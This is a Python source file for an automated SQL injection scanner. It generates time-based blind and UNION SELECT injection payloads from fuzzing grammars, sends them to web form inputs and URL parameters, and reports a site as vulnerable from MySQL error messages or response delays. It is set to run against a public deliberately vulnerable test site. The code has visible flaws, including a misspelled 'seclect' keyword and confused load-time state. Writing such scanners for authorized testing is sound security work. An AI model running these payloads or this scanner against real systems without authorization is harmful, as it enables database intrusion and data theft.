
import fuzzingbook
from fuzzingbook.Grammars import *
import sys
import urllib
import urllib.request as urllib1
import requests 
import time


import requests
from bs4 import BeautifulSoup
import logging

class sqli:
    tester_logger = logging.getLogger("Tester")

    # Disable annoying debug logs from requests module
    logging.getLogger("urllib3").setLevel(logging.WARNING)

    CHECK_LOADTIME_NUM = 10
    time_to_load = 0.0


    def get_input_fields(self,URL):
        """
        This function gets URL and returns all the id/name of the input tags in this url
        :param: URL - The url to get the info from
        """
        # Get the html page
        r = requests.get(URL)
        soup = BeautifulSoup(r.text, 'html.parser')

        # Check all the input tags
        fields = []
        for inpt in soup.find_all("input"):
        # Some sites uses the name of the tag to send the data instead of the id
            if "id" in inpt.attrs:
                fields.append(inpt["id"])
            elif "name" in inpt.attrs:
                fields.append(inpt["name"])
            elif inpt.attrs["type"].lower() == "submit":
                pass
            else:
                print("Can't handle this input tag:\n" + str(inpt))
            self.tester_logger.debug(" Input Fields: {}".format(fields))
        return fields

    def check_method(self,html):
        """
        This method checks if the sending method of given html
        is POST or GET
        """
        soup = BeautifulSoup(html, 'html.parser')

        form_tag = soup.find_all("form")
        form_tag = form_tag[0]

        self.tester_logger.debug(" Sending Method: {}".format(form_tag["method"]))
        # Sends the response to the URL
        if "method" in form_tag.attrs and form_tag["method"].lower() == "post":
            return "post"
        elif "method" in form_tag.attrs and form_tag["method"].lower() == "get":
            return "get"
        else:
            return form_tag["method"].lower()

    def check_loadtime(self,URL):
        global time_to_load
        if self.time_to_load != 0.0:
            return self.time_to_load

        time_avg = 0.0
        for x in range(self.CHECK_LOADTIME_NUM):
            item, tmp = self.get_info(URL)
            time_avg += item
        time_to_load = time_avg / self.CHECK_LOADTIME_NUM
        return time_to_load

    def get_info(self,URL, s="abudy"):
        """
        This function sends request to URL with the given s as a parameter
        The function returns the time for the response to arrive and line length of
        the html
        :param: URL - The url to send the data to.
        :param: s - string to check html for, if empty will use random value
        """
        # Get inputs ready to send
        inputs = self.get_input_fields(URL)
        data = {}

        for inpt in inputs:
            data[inpt] = s

        # Sends the response to the URL
        r = requests.get(URL)
        method = self.check_method(r.text)
        if method == "post":
            r = requests.post(URL, data=data)
        elif method == "get":
            r = requests.get(URL, data=data)
        else:
            print("Unknown method", method)
            return 0
        return r.elapsed.total_seconds(), len(r.text.split("\n"))


    def payload_check(self, URL, payload):
        """
        This is the proper wat to use this file.
        You give the funtion a url and a string, and the function checks
        whether or not the string has an impact on the site.
        return:
        error - to alert that the string is giving an error
        success - To alert that the string is working
        normal - to alert that there is no special impact on the site
        """

        normal_time, normal_length = self.get_info(URL)
        suspicious_time, suspicious_length = self.get_info(URL, payload)

        loadtime = self.check_loadtime(URL)
        self.tester_logger.info(" Normal Time: {}, Normal Length: {}".format(normal_time, normal_length))
        self.tester_logger.info(" Suspicious Time: {}, Suspicious Length: {}".format(suspicious_time, suspicious_length))

        if normal_length != suspicious_length:
            return "error"
        # Check for ten times to get avarage load time

        if suspicious_time > 2 * time_to_load:
            return "success"

        return "normal"





    error_msg = ["You have an error in your SQL syntax", "Warning: mysql_fetch_array()", "sql test"]

    def generator(self, GRAMMAR):
        return set([simple_grammar_fuzzer(GRAMMAR) for i in range(50)])


    def generator_blind_sql(self):
        SQLI_blind_GRAMMAR = {
        "<start>" : ["<sqli-payload>"],
        "<sqli-payload>" : ["<quote> <condition> <aftercondition><comment>"],
        "<condition>" : ["and", "or"],
        "<aftercondition>" : ["1=1", "1=0",  "dbms_pipe.receive_message(('a'),5)", "WAITFOR DELAY '0:0:5'" , "SELECT pg_sleep(5)", "SELECT sleep(5)"],
        "<quote>" : ["'", "\""],
        "<comment>" : ["-- ", "#", 	"/* "]
        }
        return self.generator(SQLI_blind_GRAMMAR)


    def generator_union_sql(self):
        sql_union = "<quote> <union> <select> "
        a = ["\"sql test\""]
        payloads = set()
        for i in range(0,9):
            if "<something>" in sql_union:
                sql_union = sql_union + ",<something>"
            else:
                sql_union = sql_union + "<something>"


            SQLI_union_GRAMMAR = {
                "<start>" : ["<sqli-payload>"],
                "<sqli-payload>" : [ sql_union+"<comment>"],
                "<condition>" : ["and", "or"],
                "<aftercondition>" : ["1=1", "1=0"],
                "<quote>" : ["'"],
                "<union>" : ["union"],
                "<select>" : [ "seclect"],
                "<something>" : a,
                "<comment>" : ["--", "#", ""]
                }
            payloads.update([simple_grammar_fuzzer(SQLI_union_GRAMMAR) for i in range(50)])
        return payloads


    def simple_scan(self, payloads):
        fullurl = input("Url: ")
        errormsg = ["You have an error in your SQL syntax", "Warning: mysql_fetch_array()", "sql test"]
        errorr = "yes"
        end = "no"

        for payload in payloads:
            resp = urllib1.urlopen(fullurl + urllib.parse.quote_plus(payload))
            body = resp.read()
            fullbody = body.decode('utf-8')

            for error in errormsg:
                if error in fullbody:
                    if errorr == "no":
                        print ("[-] That payload might not work!")
                        errorr = "yes"
                    else:
                        print ("[+] The website is SQL injection vulnerable! Payload: " + payload + "\r\n")
                        print ("                                                      " + fullurl+payload)
                        print ("------------------------------------------------------------------------------\r\n")
                        end = "yes"
                
            if end == "yes":
                break                   

    def check_page_with_payload(self, url, payload, type_check):
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        driver = webdriver.PhantomJS()
        start = time.time()
        driver.get(url+ urllib.parse.quote_plus(payload))

        request_time = time.time() - start
        
        WebDriverWait(driver, 20)
        print(driver.find_element_by_tag_name('body').text)
        for i in self.error_msg:
            if i in driver.page_source:
                return True
        if type_check == "blind":
            return request_time


    def union_check(self, url):
        payloads = self.generator_union_sql()

        for payload in payloads:
            check = self.check_page_with_payload(url, payload, 'union')
            if check == True:
                print ("[+] The website is SQL injection union vulnerable! Payload: " + payload + "\r\n")
                print ("                                                      " + url+payload)
                print ("------------------------------------------------------------------------------\r\n")
                break

    def blind_check(self, url):
        payloads = self.generator_blind_sql()

        for payload in payloads:
            print()
            request_time = self.check_page_with_payload(url, payload, "blind")
            print(request_time)
            break

        


URL = "http://testphp.vulnweb.com/search.php?test="
a = sqli()

a.union_check(URL)